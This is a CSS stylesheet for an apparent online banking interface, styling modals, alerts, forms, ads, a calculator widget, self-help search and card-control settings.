.token-holder { margin-left: 0px!important; vertical-align: top; }
h5 { font-size: 1.4em; color: #606060; font-weight: normal; }
.other_options .radio, .other_options .checkbox { margin-top: 0; margin-bottom: 0; float: none; clear: both; min-height: 34px; margin-bottom: 20px; }
.other_options fieldset .form-control { width: 90%; float: right; }
.other_options fieldset { vertical-align: middle }
.other_options fieldset .radio input[type="radio"] { margin-left: 0; border: none; background-color: none!important; padding-right: 0; border: none!important; }
.other_options fieldset label .form-control { float: none; display: inline-block; font-weight: normal; margin: 0 5px 0 5px; }
.other_options .radio label, .other_options .checkbox label { padding-left: 32px; font-weight: normal; }
.other_options .radio.untilCancel { margin-bottom: 8px; }
[class^="icon-"]:before, [class*=" icon-"]:before { text-decoration: inherit; display: inline-block!important; speak: none; }
.modal-dialog { margin-top: 120px }
*[class*="RUIFW-inline"] > * + * { margin-left: 0px }
.alert { margin-bottom: 0!important }
.alert-danger, .alert-error { background-color: #f2cacc; border-color: #e17f7f; background-image: none; padding: 25px 0 24px 0; color: #333333; margin: 5px!important;}
.RUIFW-modal .alert-danger, .RUIFW-modal .alert-error { background-color: #f2cacc; border-color: #e17f7f; background-image: none; padding: 25px 0 24px 0; color: #333333;margin: 0px 0px 15px 0px!important;}
.RUIFW-modal .alert-msg{width: 70%!important;}
.RUIFW-modal .alert-danger .close_icon, .RUIFW-modal .alert-error .close_icon{
 margin: -15px 10px 0 0;}
.alert-icon-error { background: url(../images/error-message.png) right top no-repeat; width: 30px; height: 33px; padding-left: 66px; display: inline-block; margin-right: 37px!important; }
.carousel-control { padding: 37% 0 0 0; height: 100%; text-shadow: none; font-size: 55px; color: #5f5f5f; text-align: center; }
.carousel-control:hover { color: #5f5f5f }
.carousel-control.left { background: none; left: -20px; filter: none; }
.carousel-control.right { background: none; left: 95%; filter: none; }
.wrapfrom label { margin-bottom: 0!important }
.banner-image img { width: 100% }
.banner-image { margin-top: 20px }
.wizard-form-title_2 input[type="radio"], .wizard-form-title_2 input[type="checkbox"] { margin: 0 }
input[type="radio"], input[type="checkbox"] { margin: 0 }
.leftappend > span { margin-left: 10px; right: auto!important; }
.leftappend > input { padding-left: 25px!important ; padding-right: 5px!important ;}
.leftappend > .has-error > input { padding-left: 25px!important; padding-right: 5px!important ; }
fieldset .radio label { padding: 1px 0 0 0 !important; font-weight: normal; vertical-align: top; top: 2px; line-height: line-height: 25px; }
.radio-inline-label { display:inline!important;padding-right:20px!important;font-weight:normal!important;vertical-align:top!important;}
table.radio-inline-table tr td {vertical-align: top!important;white-space: normal!important;}
.popover { max-width: 276px }
.popover .close { font-size: 14px; margin-right: -5px; }
.popover-content {height: 150px; width: 270px; overflow:auto;}
.popover p { margin-top: 3px; font-weight: bold; }
.popover ul { list-style: none; margin: 0; padding: 0; }
.popover ul li { vertical-align: top; margin-bottom: 5px; border-bottom: 1px solid #d6d6d4; padding-top: 5px; }
.popover ul li span { display: inline-block; width: 65%; margin-right: 5px; height: 20px; overflow: hidden; }
.datepicker td span.active:hover, .datepicker td span.active:focus, .datepicker td span.active:active, .datepicker td span.active.active, .datepicker td span.active.disabled, .datepicker td span.active[disabled] { background-color: #da1c05 }
.datepicker td span.active { background-image: none }
.datepicker .year.old,.datepicker .year.new{display:none;}
.datepicker .year.disabled,.datepicker .month.disabled{color: #999999;}
.datepicker  td span.disabled:hover{background: none;}
.RUIFW-date-picker-wrap > *[class*="icon"], .RUIFW-prepend > *[class*="icon"], .RUIFW-append > *[class*="icon"] { font-size: 17px; top: 7px; }
.alert_links { margin-top: 5px }
.alert_links a { margin: 0 8px 0 8px }
.alert_links a:first-child { margin-left: 0px }
.alert-msg { width: 80% }
.alert-msg strong { margin-right: 5px }
.btn-primary[disabled] { background-color: #c5c5c5; border: 1px solid #b8b8b8; }
.RUIFW-btn[disabled] { background-color: #c5c5c5!important; border: 1px solid #b8b8b8!important; }
.tooltip div { text-align: left }
.tooltip-inner { width: 200px!important; max-width: 400px!important; padding: 8px 8px 8px 10px; text-align: left; white-space: normal!important; }
.width760 { width: 760px }
.fontsize14 { font-size: 0.8em; font-weight: normal; }
.no-border { border-bottom: 0 }
.red-text { color: #d81e05 }
.progress { margin-bottom: 0px }
Select options { height: 20px!important; margin: 5px 0 5px 10px!important; }
*[class*="RUIFW-inline"] > .form-control { width: 100% }
.checkbox label { padding-left: 0px; font-weight: normal; vertical-align: text-top!important; min-height: 12px!important; }
*[class*="RUIFW-inline"] .radio, *[class*="RUIFW-inline"] .checkbox { line-height: 18px; margin-right: 20px; vertical-align:top!important; }
button.pull-left { margin-left: 0px }
.RUIFW-prepend > span, .RUIFW-append > span { line-height: 3.0rem; padding-top: -2px; padding-left: 5px; }
.RUIFW-append input { padding-right: 28px }
table tr td { /*word-wrap: break-word;  Internet Explorer 5.5+  word-break: break-all; */ white-space: pre-wrap; }
.homebottomtable table tr td.actions { word-wrap: normal!important; /* Internet Explorer 5.5+ */ word-break: normal!important; white-space: normal!important; }
.homebottomtable .quick-menu ul.dropdown-menu { margin: 18px -20px 0 0!important }
.overview-table tr td.actions { word-wrap: normal!important; /* Internet Explorer 5.5+ */ word-break: normal!important; white-space: normal!important; }
.overview-table tr td.actions .quick-menu ul.dropdown-menu { margin: 18px -20px 0 0!important }
.datepicker:after { content: none }
.modal { overflow-y: auto }
.modal-open { overflow: auto; overflow-x: hidden; overflow-y: scroll; }
.has-error { white-space: nowrap }
.has-error .tt-dropdown-menu{ white-space:inherit!important;  }
.has-error .twitter-typeahead{ display:inherit!important; }
strong.has-error .form-control{ font-weight:normal!important;}
.has-error .RUIFW-tooltip { vertical-align: top; margin-top: 5px; border-radius:4px; }
.has-error div { display: inline-block; vertical-align: top; }
.has-error .tokenlink_if_error { position: absolute; left: 14px; top: 30px; }
.has-error .form-alt-txt{ white-space:pre-line;}
.has-error .form-control { border-color: #D81E05; display: inline-block!important; vertical-align: top; }
.has-error.form-control { border-color: #D81E05; display: inline-block!important; vertical-align: top; }
input[type="radio"].has-error  { border-color: #D81E05!important; }
.has-error.form-control:focus {  border-color: #843534;  -webkit-box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483; box-shadow: inset 0 1px 1px rgba(0, 0, 0, .075), 0 0 6px #ce8483;}
.leftappend .has-error input{white-space:inherit; display:block!important; }
.Filter-content .has-error > *[class*="icon"] {top: 10px;}
.error-msg { color: #D81E05; nowhitespace: afterproperty; display: inline-block!important; margin: 5px 0 0 20px!important; text-align: left!important; word-wrap: break-word!important; /* Internet Explorer 5.5+ */ white-space: pre-wrap!important; width: 85%!important; }
.error-msg-below { color: #D81E05; nowhitespace: afterproperty; display: inline-block!important; margin: 0 0 0 0!important; text-align: left!important; word-wrap: break-word!important; /* Internet Explorer 5.5+ */ white-space: pre-wrap!important; width: 85%!important; }
.error-msg.error_width50{width: 50%!important;}
.error-msg.error_width60{width: 60%!important;}
.error-msg.error_width70{width: 70%!important;}
.error-msg.for_token { width: 60%!important; margin-left: 35px!important; }
.error-msg.for_wrap { margin: 5px 0 0 0!important }
table.has-error { border: 1px solid #D81E05!important }
tr.has-error { border: 1px solid #D81E05!important }
tr.has-error td { border-top: 1px solid #D81E05!important; border-bottom: 1px solid #D81E05!important; }
tr.has-error td span.error-msg { font-weight: normal }
.mini_Ad a { color: #2A5DB0!important; text-decoration: none!important; display: inline-block!important; font-size: 13px!important; padding: 0 0 0 8px; }
.mini_Ad {background:#ffffff;}
.mini_Ad h3 { color: #D81E05; margin: 0px; padding-top: 3px; }
.mini_Ad a:hover { color: #F00!important }
.mini_Ad  a:before { content: none!important; margin: 0px!important; }
.Large_Ad { margin: 0 0 -1px 0; border: 1px dotted #D7D7D7!important; padding-top: 5px; padding-bottom: 10px; background:#ffffff; }
.Large_Ad img { margin: 15px!important; max-width: 100%; padding-right: 20px; height: auto; }
.LG_medium_Ad { margin: 15px 0 15px 0; border: 1px dotted #D7D7D7!important; padding-bottom: 15px; }
.LG_medium_Ad img { max-width: 100%; height: auto; }
.S_medium_Ad { margin: 0 0 15px 0; border: 1px dotted #D7D7D7!important; padding-top: 15px!important; padding-bottom: 15px!important; background:#ffffff;}
.S_medium_Ad img { max-width: 100%; height: auto; }
.medium_Ad { margin: 0 0 15px 0; border: 1px dotted #D7D7D7!important;background:#ffffff; }
.medium_Ad .RUIFW-col-5 { vertical-align: bottom!important; text-align: center; }
.medium_Ad .RUIFW-btn-primary { vertical-align: bottom!important; margin: 25px; }
.rightlinks_ad { margin: 0 0 15px 0; border: 1px dotted #D7D7D7!important; padding-top: 10px; padding-bottom: 15px; background:#ffffff;}
.rightlinks_ad h4 { margin-top: 0px }
.modal_ad { text-align: center; margin-top: 25px; border: 1px dotted #D7D7D7!important; margin-left: 0; margin-right: 0; background:#ffffff;}
.modal_ad div { padding-top: 15px; padding-bottom: 25px; }
.marketingPage {background:#ffffff; }
.marketingPage img { max-width: 100%; height: auto; }
.offersPage {background:#ffffff;}
.offersPage img { max-width: 100%; height: auto;}
.DOB1 { width: 16%!important }
.DOB2 { width: 22%!important }
.SSN1 { width: 19%!important }
.SSN2 { width: 31%!important }
.SSN3 { width: 13%!important }
.bill_modal{max-width:800px; height:height: 518px; margin:50px auto 0 auto; }
#scrollable-dropdown-menu .tt-dropdown-menu { max-height: 150px; overflow-y: auto; }
.nowrap_month{ white-space:nowrap!important;}
.nowrap_month .form-control{  display: inline-block!important;  vertical-align: top;}
.monthstyle{ font-weight:normal; display:inline-block!important; vertical-align:top!important; padding-top:5px;}
.security_phrase{white-space:pre-wrap!important;word-wrap:break-word!important;width:100%!important; max-width: 100%!important;}
fieldset.RUIFW-inline{white-space:inherit!important;}
fieldset.RUIFW-inline .radio,fieldset.RUIFW-inline .radio label{white-space:nowrap!important;}
.modal.RUIFW-print-view .modal-header .modal-title{ margin-top:-5px!important;}
.modal.RUIFW-print-view .modal-header .btn-primary{ margin-right:10px;}
.modal.RUIFW-print-view .modal-body .accnt-act-details2{display:none!important;}
.modal.RUIFW-print-view .modal-body .accnt-act-details1{border: 1px solid #D7D7D7!important; padding:10px;}
.image_100{    max-width: 100%!important;    height: auto!important; width:100%;  }
input[type='radio']{   background:none; vertical-align:top; margin-top:5px;}
.radio_100 tr td{max-width: 100%!important;width:100%; white-space:nowrap; vertical-align:top;  }
.radio_100 tr td input{vertical-align:top;  }
.radio_100 tr td label{ display:inline-block; font-weight:normal; margin:0 0 0 5px; vertical-align:top; }
*[class*="RUIFW-inline"] .radio input[type="radio"]{top: -3px;}
*[class*="RUIFW-inline"] .checkbox input[type="checkbox"]{top: 3px;}
fieldset.RUIFW-inline .checkbox{margin-top:5px;}

@media screen {
.noprint {display: block;}
#printHeader, #printFooter, #printHeaderTable, #transactionDetails{display:none!important;}
#headerData_pabp_dispute{display: none!important;}
#headerData_pabp{display: none!important;}
#headerData_pabp_create{display: none!important;}
#headerData_pabp_cancel{display: none!important;}

}

 @media only screen 
  and (max-width: 960px)  {	  
	  .main-icons,.main-icons > ul >li {display: table-cell; float:none !important; background: #d81e05; }
	  .main-icons{padding-left:6px; }
	  .RUIFW-nav-main > li > a {padding:12px 6px 12px 6px!important;}
	  .RUIFW-nav-main {padding-left: 2px !important;}
	  .main-icons li .dropdown-menu { position: absolute; left: inherit !important; right: inherit !important; margin-left: -10px; }

}

/* RUIFW-calculator */
.RUIFW-calculator {   background:#EFEFEF; width: 250px !important; border:1px solid #ccc; box-shadow:1px 1px 4px #EEEEEE; border-radius:5px; padding: 35px 8px 8px 8px; position: absolute; z-index: 9999;height: 270px !important; max-height: 300px !important;display:none;}
.RUIFW-calculator #calculator-field{background: #fff; -webkit-box-shadow: none;  box-shadow: none; text-align: right; border-color: #ccc; cursor:default;}
.calc-getnumber-field{visibility: hidden; height: 0px; width: 0px; overflow: hidden;}
.RUIFW-calculator-input { height: 42px;  font-size: 42px; line-height: 35px;  width: 100%;  background:#FFF; }
.RUIFW-calculator-keys {padding: 5px 0 0 0;}
.RUIFW-calculator-keys > .row-fluid > button {margin: 4px 2px;  width: 51px;}
.RUIFW-calculator-keys > .row-fluid:last-child{text-align: right;}
.RUIFW-calculator-keys > .row-fluid > button.btn-primary {margin: 4px 2px;  width: 108px;}
.RUIFW-calculator > .RUIFW-calculator-head { cursor: move; width: 100%; height: 20px; margin: -30px 0 10px 0;}

/* CMS Styles */
.marketing-link a{color:#2a5db0 !important;}
.marketing-link a:before{content:"";}
.marketing-link p{margin:0;}

/* CSS for Leap Phase 2 Applications start */
/* optimized for 1280x800 screens */
.termsandconditionsWrap{height: 363px;overflow: auto;background: #fff none repeat scroll 0 0;padding: 10px; width:100%}
/* .modal-body-wrapper{max-height:330px; overflow:auto;} */
.txt-ctr{text-align:center !important}
#targetMarketingModalWindow{margin-top:40px;}
#RUIFW-print-terms-modal .modal-dialog{width:770px !important; padding:0;}
#RUIFW-print-terms-modal .modal-content{ background:#ebebeb; border-radius:6px;}
/** chnages for low resolution*/
#targetMarketingModalWindow .modal-dialog {width: 750px; min-height:217px}
#targetMarketingModalWindow .modal-content{ border-radius:6px;}
#targetMarketingModalWindow .modal-header{padding:15px 15px 0 30px;}
#termsAndConditionsErr {float:left;width:60%;margin-top: -5px;  margin-left: -15px;}
.modal.RUIFW-print-view .modal-header .modal-title{ width:90%; color:#d81e05}
#targetMarketingModalWindow h6 {margin: 8px auto; font-size: 18px;}
.font16{font-size:16px;}
#RUIFW-print-terms-modal .modal-dialog {margin-top:180px;}
.mrgn-top-30{margin-top:30px;}
.mrgn-top-60{margin-top:60px;}
.printTermsFooterDisplay {display:none}
.box-hr-separator6 { border-top: 1px dotted #d7d7d7; margin: 20px 0 25px 0; height: 1px; width: 100%; }
.mrgn-top-minus40 { margin-top: -40px !important }
.mainWrap{padding:25px;  margin-bottom:0px;}
.pad-left-50{padding-left:50px;}
.download-print-button {position:absolute; bottom:58px; left:48px;}
#RUIFW-print-terms-modal .modal-footer{padding:10px 0px 25px}
.leftWrapper{float:left;margin:0 7px 0 0; padding:0;border: 1px solid #d8d8d8}
.addinfo-err-msg{float:left;margin-top:5px;color:#D81E05;}
.leftWrapper input{margin-top:0px;}
#campaignForm .modal, #RUIFW-print-terms-modal {text-align: center;padding: 0!important; margin-top:0px;}
#campaignForm .modal:before, #RUIFW-print-terms-modal:before {content: '';display: inline-block;vertical-align: middle;margin-right: -4px; margin-top:0px; height:100%;}
#ActSumryTimeOut.modal:before{height:auto !important; }

/* begin Digital Sales ripple application form */
#cancelOfferModal .RUIFW-modal-header.modal-header > img { height: 20px; }
#cancelOfferModal .RUIFW-modal-header.modal-header { padding: 22px 25px 0px 25px; }
#cancelOfferModal .RUIFW-modal-content.modal-content { width: 492px; height: 189px; border-radius: 4px; }
#cancelOfferModal .RUIFW-modal-body.modal-body { padding: 28px 30px 13px 30px; }
#cancelOfferModal .RUIFW-btn, #cancelOfferModal a { padding: 3px 30px; }
/* end Digital Sales ripple application form */


/* begin sales deposit account */
.overview-table .sales-da-entry-point { margin-bottom: 15px; border: 0.5pt solid #e2e2e2; }
.overview-table tr.sales-da-entry-point > td { background-color: #F5F5F5; white-space: normal !important; padding-top: 10px !important; padding-bottom: 10px !important;}
.overview-table .sales-da-entry-point td.account-type > a { width: 185%; }
.overview-table .sales-da-entry-point .sales-da-entry-point-title { font-weight: bold; color: #d81e05; font-size: 16px; line-height: 20px; }
.overview-table .sales-da-entry-point .sales-da-entry-point-subtitle { letter-spacing: 0.3px; color: #606060; font-size: 13px; line-height: 18px; }
.overview-table .sales-da-entry-point:hover .sales-da-entry-point-subtitle { color: #606060 }
.overview-table .sales-da-entry-point:hover .sales-da-entry-point-title { color: #A6000E }
.overview-table .sales-da-entry-point .add-icon { 
  background-image: url("../images/addIconHover.png");
  background-size: 20px;
  height: 20px;
  position: relative;
  top: 10px;
  width: 20px;
}
.overview-table .sales-da-entry-point .add-icon.disabled {
  background-image: url("../images/addIconHoverDisable.png");
}
/* end sales deposit account



/* JIRA bug IBDSS-194 
	scroll bar displayed on intercept page when timeout modal is dismissed 
	fix styling of intercept modal window */
/* #campaignForm .modal, #RUIFW-print-terms-modal, #ActSumryTimeOut {text-align: center;padding: 0!important; margin-top:0px;}
#campaignForm .modal:before, #RUIFW-print-terms-modal:before, #ActSumryTimeOut.modal:before {content: '';display: inline-block;vertical-align: middle;margin-right: -4px; margin-top:0px; height:100%;} 
 #ActSumryTimeOut.modal:before{height:auto !important; } 
#targetMarketingModalWindow .modal-dialog, #RUIFW-print-terms-modal .modal-dialog, #ActSumryTimeOut .modal-dialog {display: inline-block;text-align: left;vertical-align: middle;padding:0;margin:0 auto;max-height:100%;} */
#targetMarketingModalWindow, #RUIFW-print-terms-modal{text-align: center;padding: 0!important; margin-top:0px;}
#targetMarketingModalWindow.modal:before, #RUIFW-print-terms-modal:before {content: '';display: inline-block;vertical-align: middle;margin-right: -4px; margin-top:0px; height:100%;}
/* end JIRA bug IBDSS-194 */

#targetMarketingModalWindow .modal-dialog, #RUIFW-print-terms-modal .modal-dialog {display: inline-block;text-align: left;vertical-align: middle;padding:0;margin:0 auto;max-height:100%;}

#targetMarketingModalWindow .prod-benefits-web { color: #606060; font-size: 14px; }
#targetMarketingModalWindow .prod-benefits-web-scrollable { overflow: auto; height: 387px; }
#targetMarketingModalWindow .prod-benefits-web .toggleProductBenefits { padding: 14px 10px 14px 10px; color: #2A5DB0; text-decoration: none; }
#targetMarketingModalWindow .prod-benefits-web .icon-angle-down { font-size: 20px; position:relative; top: 1px; padding: 0px 15px 0px 8px; }
#targetMarketingModalWindow .prod-benefits-web .icon-angle-up { font-size: 20px; position:relative; top: 1px; padding: 0px 15px 0px 8px; }
#targetMarketingModalWindow #productBenefitDetails { margin-top: -25px; padding-top: 20px;}
#targetMarketingModalWindow #productBenefitDetails ul li { margin-bottom: 10px}
#targetMarketingModalWindow #productBenefitDetails > div:first-child { margin: 0px 90px; }
#targetMarketingModalWindow #aunth_sect_btns a, #aunth_sect_btns #tellMeLaterButton { font-family: arial; font-size: 14px; line-height: 16px; text-align: center; border-radius: 4px; color: #FFFFFF;}
#aunth_sect_btns #tellMeLaterButton { padding: 10px 15px; height: 38px; }
#targetMarketingModalWindow .toggleProductBenefits .icon-angle-down, .icon-angle-up {font-size: 20px; margin-left: 5px; position: relative; top: 2px;}
#targetMarketingModalWindow .prod-benefits-mob-title{ font-family: Arial; font-style: normal; font-weight: bold; font-size: 14px; line-height: 16px; color: #606060; margin-bottom: 10px}
#targetMarketingModalWindow .prod-benefits-web-title { color: #333333; margin-bottom: 25px; }
#targetMarketingModalWindow .prod-benefits-web ul { padding-left: 17%; padding-right: 17%; }
#targetMarketingModalWindow .prod-benefits-web li::before{ content: ''; position: absolute; left: -10px; top: 5px; height: 12px; width: 15px; background-image: url(../../mobile/images/red-tick.svg); }
#targetMarketingModalWindow .prod-benefits-web li { list-style-type: none; position: relative; padding: 0px 0px 25px 20px; }


/* JIRA bug IBDSS-189
	fix issue where timeout dialog is hidden behind any existing modal dialogs
	override MCAC styles to retain LEAP standard styles */
#ActSumryTimeOut.modal:before{vertical-align:top; }
#ActSumryTimeOut .modal-dialog{width:600px !important; margin-top:120px; padding-top:10px }
#ActSumryTimeOut .modal-content{border-radius:0; border:1px solid rgba(0, 0, 0, .2)}
/* end JIRA bug IDSS-189 */

.mainWrap label{font-weight:normal; margin:0;}
a.dwn-button{float: left;background: #606060;padding:3px 15px 4.81px;border-radius: 4px;color: #fff; cursor: pointer; font-size:1.4rem;}
a.dwn-button:hover{color:#fff;}
#infoView .leftWrapper { border: 0;}
#infoView .grey-box2 {width:99%}

.acceptWrap{margin-bottom:20px; float:left; width:100%;}
.acceptBox input{position:relative; top:2px;}
.btn-holder a.mrgn0{margin:0 !important;}
.btn-holder a.mrgn-lft-3{ margin-left:3px !important;}
#RUIFW-print-terms-modal .close_icon{position:absolute; top:25px; right:15px;}
.mrgn-space{margin:0 0 25px 25px;}
.font11{font-size:11px;}
.mrgn-top-minus25{margin-top:-25px;}

.modal-open, .modalPrint { overflow: auto; overflow-x: hidden; overflow-y: hidden;}

.modal-open {    overflow: auto;    overflow-x: hidden;    overflow-y: hidden;}
#targetMarketingModalWindow .modal-header{padding:15px 15px 0 30px;}
#targetMarketingModalWindow h6{ font-size:16px; margin:8px 0}
.acceptWrap{margin-bottom:20px; }
#targetMarketingModalWindow .modal-footer{padding:10px 20px 30px;}

/**
  Changes for Low Resolution in Intercept starts
**/
@media screen and (max-width: 1024px) { 
#targetMarketingModalWindow .modal-dialog{width:490px; height:auto !important;}
#targetMarketingModalWindow .modal-title img{width:120px;}
.modal-body-wrapper img{width:450px; height:191px;}
#targetMarketingModalWindow h1{font-size:20px;}
#targetMarketingModalWindow h6{font-size:14px;}
.font16{font-size:14px;}
#targetMarketingModalWindow .prod-benefits-web { font-size: 12.5px !important; }
#targetMarketingModalWindow .prod-benefits-web-scrollable { height: 273px; }
.pad-left-50{padding-left:0;}
a#learnMoreLink, .acceptWrap, #termsAndConditionsErr{font-size:10px;}
.btn-holder button, .btn-holder input, .btn-holder a{font-size:12px;}
.acceptWrap{margin-bottom:25px;}
} 
/**
  Changes for Low Resolution in Intercept end
**/

/* CSS for Leap Phase 2 Applications end */

/* CSS for Leap Phase 2 - Selfhelp Start */
.selfHelpModal p{font-size:13px;margin:0 0px 0px 15px}
.selfHelpModal .modal-title{background:#D81E05; color:#fff; font-size:24px; padding:10px 20px;}
.selfHelpModal .modal-header{padding:0}
.selfHelpModal .modal-title span{margin-top:5px;}
.selfHelpModal .modal-header .close-btn { color: #fff; position:absolute; right:20px; top:13px; background:transparent; border:1px solid #fff; width:81px; height:30px; border-radius:4px; font-size:14px;}
.selfHelpModal label{font-weight:normal; font-size:16px; margin-bottom:15px;}
.selfHelpModal .modal-body{padding:30px;min-height:508px;}
.selfHelpModal .modal-body h2{font-size:20px; color:#d81e05 !important; margin:0px 0 15px 0px; padding:0;}
.SHsearchBox .btn{padding: 4px 10px 5px;  background:#da1c05 url("../images/search-icon.png") no-repeat 12px 2px !important; width:38px; height:20px; display:block;margin:0px !important;border:none;outline:none }
.SHsearchBox .btn:hover{z-index:0;border:none;margin-left:0px;background-color:transparent !important;outline:none}
.selfHelpModal .input-group{margin:0px 0px 20px 0px;}
.SHsearchBox .input-group-btn {background:#da1c05; border-top-right-radius:4px; border-bottom-right-radius:4px}
.SHsearchBox .form-control{border-right:0; box-shadow:none; color:#606060; padding:0 10px}
.selfHelpModal .toggle-btn{background:#fff;}
.rhs-searchWrap-margin{ margin:0px 14px 0px 40px}
.top-dotted-line{border-top:1px dotted #c5c5c5; padding-top:15px; margin-top:8px;margin-bottom: 5px}
.msgHead{font-size:16px;margin-bottom: 10px;}
.mrgn-btm-12{margin-bottom:12px;}
.mrgn-btm-40{margin-bottom:40px;}
.asktxt{ margin:10px 0px 8px 40px; font-size:12px; }
.selfHelpModal .panel-default{border-bottom:0px solid #f1f1f1; border-top:none; border-left:none; border-right:none; box-shadow:none; margin:0 0 20px; }
.exp-accordion .in{padding:0 0 15px}
.exp-accordion h4 {margin:0 0 10px;}
.exp-accordion h4 a{padding: 0 0 0 14px;font-size:14px;display:block; margin-top:0;line-height: 18px;}
.exp-accordion h4 a:before { color: #2a5db0;margin: -2px 0 0 -15px;}
.arrow-on:before{ color: #d81e05 !important;content: "\f0da"; font-size: 16px;  font-family: fontAwesome; position:absolute; margin:1px 0 0 -14px}
.arrow-off:before{color: #d81e05 !important;content: "\f0d7";font-family: fontAwesome; font-size: 16px; position:absolute; margin:1px 0 0 -14px  }
.close-btn{background:#fff;  border: 0 none;  border-radius: 4px; padding: 4px 10px; position: absolute; right: 48px;top: 37px;}
.viewmore-btn{background: #fff !important; border: 0; width: 96px !important; text-align: center; margin: 0 auto; color:#2A5DB0; height: 30px;font-size:13px; outline:none;}
.viewmore-arrow{display: inline; margin:-8px 0 0 0px;  position: absolute; font-size:13px;color:#2A5DB0;}
.selfHelpModal .toggle-btn:after{font-size:16px;}
input.search-no-overlap {z-index: 0 !important;}
#timeOut {z-index:1046 !important;}
/****** Style Star Rating Widget *****/
.ratingWrap{float:left;margin-left:-87px; position:relative; margin-bottom: 20px}
.rate{position:absolute; left: 210px;  top: 2px;width:100px}
.starRating:not(old){  display : inline-block; width : 100%;height: 1.5em;overflow:hidden;vertical-align:bottom;}
.starRating:not(old) > input{ margin-right : -100%; opacity : 0;}
.starRating:not(old) > label{display: block;float: right;position:relative;background: url('../images/star-icon.png'); background-size:contain; height:15px; width:15px; margin-right:5px;}
.starRating:not(old) > label:before{content : '';display : block;width: 15px;height:15px;background : url('../images/star-icon-hover.png');  background-size : contain; opacity : 0; transition: opacity 0.2s linear; margin-right:5px;}
.starRating:not(old) > label:hover:before,.starRating:not(old) > label:hover ~ label:before,.starRating:not(:hover) > :checked ~ label:before{ opacity : 1;}

/*******SelfHelp MVP2 Styles****************/
h4.exactMatchSingle{ font-size:14px; color:#606060; text-decoration:none;}
.suggestMatchLink {display:table;font-size:14px !important; margin:0 0 10px;color: #2a5db0; text-decoration:none;line-height: 16px;}
.msgHead1{font-size:14px;margin-bottom: 15px;}

/*******SelfHelp MVP2 Isuggest Styles -Start****************/
.ui-helper-hidden {	display: none; }
.ui-helper-hidden-accessible {border: 0;clip: rect(0 0 0 0);height: 1px;margin: -1px;overflow: hidden;padding: 0;position: absolute;width: 1px;}

.ui-widget-content {border: 1px solid #a6c9e2;background: #fcfdfd 50% bottom repeat-x;color: #222222;}
.ui-widget {font-family: Lucida Grande,Lucida Sans,Arial,sans-serif;font-size: 1.1em;}
.ui-menu {list-style: none;padding: 2px;margin: 0; display: block; outline: none;}
.ui-autocomplete {position: absolute;top: 0;left: 0;cursor: default;}
.ui-front {z-index: 100;}
.ui-menu .ui-menu-item {margin: 0;padding: 0;width: 100%;}
.ui-menu .ui-menu-item a {text-decoration: none;display: block;padding: 2px 15px 3px 15px;line-height: 16px;}
.ui-widget-content a {color: #606060;}

/* .ui-state-hover,
.ui-widget-content .ui-state-hover,
.ui-widget-header .ui-state-hover,
.ui-state-focus,
.ui-widget-content .ui-state-focus,
.ui-widget-header .ui-state-focus {	background: #F1F1F1;color: #2A5DB0 !important;} */

.ui-state-hover a,
.ui-state-hover a:hover,
.ui-state-hover a:link,
.ui-state-hover a:visited,
.ui-state-focus a,
.ui-state-focus a:hover,
.ui-state-focus a:link,
.ui-state-focus a:visited {	background: #F1F1F1;	color: #2A5DB0 !important;}
/*******SelfHelp MVP2 Isuggest Styles -Start****************/

/* CSS for Leap Phase 2 - Selfhelp  End*/
#messages p{margin:0}
/*** CSS for Prefill**/
.prefilled-card-sales-banner{padding: 10px 10px 10px 20px;border-top:1px dotted #D7D7D7;}
.prefilled-card-sales-banner .row div{display: table-cell; vertical-align: middle; float:none;}
/* JIRA bug IBDSS-529 mega menu banner image getting cropped */
.megamenu-prefilled-card-sales-banner{margin-top: -15px;}
.megamenu-prefilled-card-sales-banner{width:90% !important;}


/*----------------- Caribbean Alerts & Controls -------------------*/
.radio-component td{white-space: nowrap; padding: 0 25px 0 0; }
.radio-component td label{display: inline-block; font-weight:normal; margin:2px 0 0 2px;}
.radio-component td input{margin: 3px 5px 0 0;}


.card-controls-table .RUIFW-tooltip{margin-left: -5px !important; }
.card-controls-table > thead > tr > th{vertical-align: middle;}
.card-controls-table > thead > tr > th.status{width: 15%;}
.card-controls-table > thead > tr > th.auth-limit{width: 20%;}
.card-controls-table > thead > tr > th.trans{width: 20%;}
.card-controls-table > thead > tr > th.cc{width: 45%;}
.card-controls-table > tbody > tr > td{white-space: normal; vertical-align: middle; padding:25px 5px 25px 5px;}
.card-controls-table > tbody > tr > td.trans label{font-weight: normal; padding-left:15px;}
.card-controls-table > tbody > tr > td:first-child{text-align: left;}
.card-controls-table.v3 > tbody > tr > td:last-child{text-align: left; white-space: normal !important;}
.card-controls-table > tbody > tr > td .card-number{margin-top:10px;}
.card-controls-table > tbody > tr > td .cc-img{padding-left:0; }
.card-controls-table > tbody > tr > td .cc-number{padding-left:10px; }
.cc-error {background: url(../images/cc-error.png) left center no-repeat; padding: 0 0 0 30px; font-weight: bold; }
input[type=checkbox].cardControlSwitch {display:none;}
input[type=checkbox].cardControlSwitch + label {background: url(../images/Switch-OFF.svg) left center no-repeat; height: 34px; width: 60px;margin:5px 0 0 0; display:inline-block; padding: 0 0 0 0px;}
input[type=checkbox].cardControlSwitch:checked + label {background: url(../images/Switch-ON.svg) left center no-repeat; height: 34px; width: 60px;margin:5px 0 0 0; display:inline-block; padding: 0 0 0 0px;}
.cc-error {background: url(../images/cc-error.png) left center no-repeat; padding: 0 0 0 30px; font-weight: bold; white-space: normal}
.cc-preloader {background: url(../images/preloader.svg) center center no-repeat; height: 40px; width: 40px; padding: 0 0 0 0px; font-weight: bold; white-space: normal}

.info-notification,.mob-notification {padding:0 0 0 40px;}
.info-notification label,.mob-notification label{margin-bottom:0;}
.info-notification img{margin-left: -30px; margin-top: 2px; position: absolute;}
.info-notification img{margin-left: -30px; margin-top: 2px; position: absolute;}
.info-notification div {word-wrap: break-word;}


.email-notification,.mob-notification {padding:0 0 0 30px;}
.email-notification label,.mob-notification label{margin-bottom:0;}
.mob-alert-sms,.mob-alert-app{padding:0 0 10px 40px; }
.email-notification img{margin-left: -30px; margin-top: 2px; position: absolute;}
.mob-notification img{margin-left: -25px; position: absolute;}
.mob-alert-sms:before,.mob-alert-app:before{content: "-";position: absolute; margin-left: -10px;}
.email-notification span:first-of-type, .mob-notification span:first-of-type, .alerts-history-empty-desc, .alerts-settings-empty-desc{ margin-bottom: 0; font-weight: bold; color: #606060; font-size: 1.3rem; font-size: 13px; }
.email-notification div {word-wrap: break-word;}
.alerts-security-list { list-style-type:none; padding-left: 0 !important;}
